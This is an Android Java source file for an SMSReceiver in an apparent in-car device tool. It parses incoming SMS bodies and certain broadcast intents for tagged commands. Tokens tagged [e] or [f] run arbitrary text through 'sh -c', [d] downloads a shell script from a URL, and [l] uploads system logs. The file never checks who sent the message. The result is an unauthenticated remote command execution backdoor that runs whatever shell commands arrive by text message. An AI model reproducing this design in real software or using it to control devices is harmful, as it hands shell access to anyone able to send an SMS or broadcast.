package com.lejia.devtool;

import java.io.File;
import java.util.StringTokenizer;
import java.io.IOException;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.text.TextUtils;
import android.widget.Toast;
import com.lejia.devtool.download.logic.DlFileHelper;
import com.lejia.devtool.download.logic.DlFileHelperConfig;
import com.lejia.devtool.upload.UploadDumpLogService;
import java.util.Date;

public class SMSReceiver extends BroadcastReceiver {

	private static final String TAG = "SMSReceiver";
	private static final String strRes = "android.provider.Telephony.SMS_RECEIVED";
	private static final String strExecRes = "android.lejia.download.EXEC";
	private static final String AppRemoteControlRes = "android.lejia.applayer.rc";//appLayer remote control
	private static final String AppRCBundle = "com.ileja.rc.extra";
	private static final String RootDir = "/storage/sdcard0/";
	private static final String BaseDir = "/storage/sdcard0/RemotExecFolder/";
	private static final String ExecBaseDir = "/data/carrobot/";
	private static final String shFileName = "execCmd.log";
	private static final String ExecDumpSysLog = "sh /data/carrobot/carrobot_dumpsyslog.sh";
	private static final String ExecCmdLog = "/data/carrobot/execCmd.log";
	public static final String UPLOAD_SYSLOG_EXTRA_KEY = "com.lejia.upload.syslog.extra";
	public static final String UPLOAD_EXECCMD_EXTRA_KEY = "com.lejia.upload.execcmd.extra";	

	@Override
	public void onReceive(Context context, Intent intent) {
		String action = intent.getAction();
		Log.i(TAG,"get onReceive : " + ((TextUtils.isEmpty(action))?"NULL":action));
		if(TextUtils.isEmpty(action)){
			Log.i(TAG, "onReceive action is NULL , return.");
			return;
		}
		if(strRes.equals(action)){
			StringBuilder sb = new StringBuilder();
			Bundle bundle = intent.getExtras();  
           
		 	if(bundle!=null){
				Object[] pdus = (Object[])bundle.get("pdus");  
				SmsMessage[] msg = new SmsMessage[pdus.length];  
				for(int i = 0 ;i<pdus.length;i++){  
					msg[i] = SmsMessage.createFromPdu((byte[])pdus[i]);  
				}  
	                	  
				for(SmsMessage curMsg:msg){ 
					Log.i(TAG, "SMS from : " + curMsg.getDisplayOriginatingAddress()+"//"+curMsg.getDisplayMessageBody());		
	         		sb.append(curMsg.getDisplayMessageBody()); 
	        	}  
	            Log.i(TAG,"SMS data : " + sb.toString());
	            execMmsCommand(sb.toString());
			}  
		} else if(strExecRes.equals(action)){
			Bundle bundle = intent.getExtras(); 
			if(null != bundle){
				String execCommand = bundle.getString("com.ileja.download.execfile");
				if(!TextUtils.isEmpty(execCommand)){
					execMmsCommand(execCommand);
				}
			}
		} else if(AppRemoteControlRes.equals(action)){
			Bundle bundle = intent.getExtras(); 
			if(null != bundle){
				String execCommand = bundle.getString(AppRCBundle);
				if(!TextUtils.isEmpty(execCommand)){
					execMmsCommand(execCommand);
				}
			}
		}
	}

	private void execMmsCommand(String rcvData){
		if(TextUtils.isEmpty(rcvData)){
			return;
		}

		StringTokenizer smsData = new StringTokenizer(rcvData, ";" , false);
	    if(null != smsData){
          	while(smsData.hasMoreElements()){
           		String tmpStr = smsData.nextToken();
           		Log.i(TAG, "smsData.nextToken tmpStr : " + tmpStr);
          		if(!TextUtils.isEmpty(tmpStr)){
          			int mExecRlt = -1000;
           			if(tmpStr.contains("[") && tmpStr.contains("]")){
           				if(tmpStr.contains("[e]")){
           					mExecRlt = runScript(tmpStr.replace("[e]", ""), true);
           					if(mExecRlt >= 0){
           						uploadSysLog(ExecCmdLog, true);
           					}
           				}else if(tmpStr.contains("[f]")){
							mExecRlt = runScript(tmpStr.replace("[f]", ""), true);
           				}else if(tmpStr.contains("[d]")){           					
           					if(FileUtil.isTopURL(tmpStr.replace("[d]", ""))){
           						DlFileHelper.getIns().init(new DlFileHelperConfig.Builder().enableDownload(true)
										.setMode(DlFileHelperConfig.Builder.Mode_SH).build());
								DlFileHelper.getIns().download(tmpStr.replace("[d]", ""));
           					}
           				}else if(tmpStr.contains("[l]")){
							uploadSysLog(ExecDumpSysLog, false);
           				}
           				Log.i(TAG, "mExecRlt : " + mExecRlt);
           				/*if(mExecRlt >= 0){
           					uploadSysLog(ExecDumpSysLog);
           				}*/
           			}
         		}
         	}
          }
		/*
		if(!FileUtil.isTopURL(execCommand)){
			Log.i(TAG, "execCommand is not a valid url.");
			runScript(execCommand);
		}else{
			DlFileHelper.getIns().init(new DlFileHelperConfig.Builder().enableDownload(true)
				.setMode(DlFileHelperConfig.Builder.Mode_SH).build());
			DlFileHelper.getIns().download(execCommand);
		}*/
	}

	private void writeExecFile(String rcvData){
	           	if(!TextUtils.isEmpty(rcvData)){
	           		/*File rootDir = new File(RootDir);	                		
					if(!(rootDir.exists()) || !(rootDir.isDirectory())){
						Log.i(TAG, RootDir + " not exists ...");
						return;
					}*/

	         		File shDir = new File(ExecBaseDir);	                		
					if(!(shDir.exists()) || !(shDir.isDirectory())){
						boolean mkdirsRlt = shDir.mkdirs();
						Log.i(TAG, "mkdirsRlt : " + mkdirsRlt);
						if(!mkdirsRlt) return;
					}

					File execShFile = new File(ExecBaseDir + shFileName);
					if(!execShFile.exists()){
						try{
							boolean createFileRlt = execShFile.createNewFile();
							Log.i(TAG, "createFileRlt : " + createFileRlt);
						}catch(IOException e){
							Log.i(TAG, "IOException e : " + e.toString());
							return;
						}						
					}

					//StringTokenizer smsData = new StringTokenizer(rcvData, ";" , false);
					if(execShFile.exists()){
	                	String filePath = execShFile.getAbsolutePath();
	               		if(!TextUtils.isEmpty(filePath)){
	               			StringBuffer sb = new StringBuffer("\r\n");
	               			sb.append("===========").
	               			   append(new Date()).
	               			   append("===========").
	               			   append("\r\n").
	               			   append("Exec : ").
	               			   append(rcvData).
	               			   append("\r\n");
	       					FileUtil.saveStringToFile(filePath, sb.toString(), true);
          					/*while(smsData.hasMoreElements()){
           						String tmpStr = smsData.nextToken();
           						Log.i(TAG, "smsData.nextToken tmpStr : " + tmpStr);
          						if(!TextUtils.isEmpty(tmpStr)){
           							FileUtil.saveStringToFile(filePath, tmpStr+="\r\n" , true);
         						}
         					}*/
          				}
					}
				}
	}

	private void uploadSysLog(String rcvData, boolean isExec){
		if(TextUtils.isEmpty(rcvData)){
			Log.e(TAG, "uploadSysLog rcvData is null...");
			return;
		}
        Intent service = new Intent(LauncherApplication.getContext(), UploadDumpLogService.class);
        service.putExtra(UPLOAD_SYSLOG_EXTRA_KEY, rcvData);
        service.putExtra(UPLOAD_EXECCMD_EXTRA_KEY, isExec);
        LauncherApplication.getContext().startService(service);
    }

    private void uploadLog(){
        Intent service = new Intent(LauncherApplication.getContext(), DumpLogService.class);
        LauncherApplication.getContext().startService(service);
    }


	private synchronized int runScript(String execCmd, boolean isReDirect) {
		if(TextUtils.isEmpty(execCmd)){
			return -100;
		}
			Process proc = null;
			int execRlt = -300;

			try {
				if(isReDirect){
					writeExecFile(execCmd);
					String[] cmds = {"sh","-c", execCmd + " >> " + ExecCmdLog};
					proc = Runtime.getRuntime().exec(cmds);				
					if(null != cmds && !TextUtils.isEmpty(cmds[2]))Log.i(TAG, "[NOTE] Exec: " + cmds[2]);
				}else{					
					if (Utils.isFileExist(execCmd)) {
						File file = new File(execCmd);
						file.setExecutable(true, false);
						Log.i(TAG, "runScript filePath: " + execCmd);
						Log.i(TAG, "runScript file.canExecute : " + file.canExecute());

						proc = Runtime.getRuntime().exec(execCmd);				
						Log.i(TAG, "[NOTE] Exec: " + execCmd);
					}
				}				
				execRlt = proc.waitFor();
				Log.i(TAG, "[NOTE] Exec execRlt : " + execRlt);
				proc.destroy();
			} catch (IOException e) {
				e.printStackTrace();
				Log.e(TAG, "IOException : " + e.toString());
				execRlt = -400;
			} catch (Exception e) {
				e.printStackTrace();
				execRlt = -500;
			} finally {

				
			}

			return execRlt;
	}

}